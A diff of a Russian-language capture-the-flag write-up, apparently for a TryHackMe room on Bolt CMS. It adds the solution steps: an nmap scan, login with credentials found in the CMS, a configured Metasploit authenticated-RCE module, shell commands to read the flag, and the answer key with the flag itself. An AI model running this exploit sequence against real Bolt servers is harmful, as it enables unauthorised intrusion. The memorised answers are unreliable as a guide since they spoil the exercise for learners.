@@ -22,9 +22,15 @@
 ### Ответьте на вопросы ниже
 Какой номер порта имеет веб-сервер с работающей CMS?
 ```commandline
+nmap <IP>
+```
+```commandline
 8000
 ```
 Какое имя пользователя мы можем найти в CMS?
+```commandline
+http://<IP>:8000
+```
 ```commandline
 bolt
 ```
@@ -34,6 +40,10 @@ boltadmin123
 ```
 Какая версия CMS установлена на сервере? (Пример: Название 1.1.1)
 ```commandline
+http://<IP>:8000/bolt/login
+# bolt:boltadmin123
+```
+```commandline
 Bolt 3.7.1
 ```
 Есть эксплойт для предыдущей версии этой CMS, который позволяет аутентифицированный RCE.  Найдите его на Exploit DB. Какой у него EDB-ID?
@@ -42,7 +52,23 @@ Bolt 3.7.1
 ```
 Metasploit недавно добавил модуль эксплойта для этой уязвимости. Каков полный путь для этого эксплойта? (Например: explore/....)
 
-Примечание: Если вы не можете найти модуль эксплойта, скорее всего, ваш metasploit не обновлен. Запустите ` apt update `, затем ` apt install metasploit-framework `
+Примечание: Если вы не можете найти модуль эксплойта, скорее всего, ваш metasploit не обновлен. Запустите ` apt 
+update `, затем ` apt install metasploit-framework ` 
+
+```commandline
+apt update
+apt install metasploit-framework
+msfconsole
+search bolt
+use exploit/unix/webapp/bolt_authenticated_rce
+set RHOSTS <IP>
+set LHOST <IP>
+set USERNAME bolt
+set PASSWORD boltadmin123
+set TARGETURI http://<IP>:8000/
+exploit
+```
+
 ```commandline
 exploit/unix/webapp/bolt_authenticated_rce
 ```
@@ -51,6 +77,12 @@ exploit/unix/webapp/bolt_authenticated_rce
 Ответ не нужен
 ```
 Найдите flag.txt внутри машины.
+```commandline
+whoami
+cd /home
+ls -al
+cat flag.txt
+```
 ```commandline
 THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
 ```
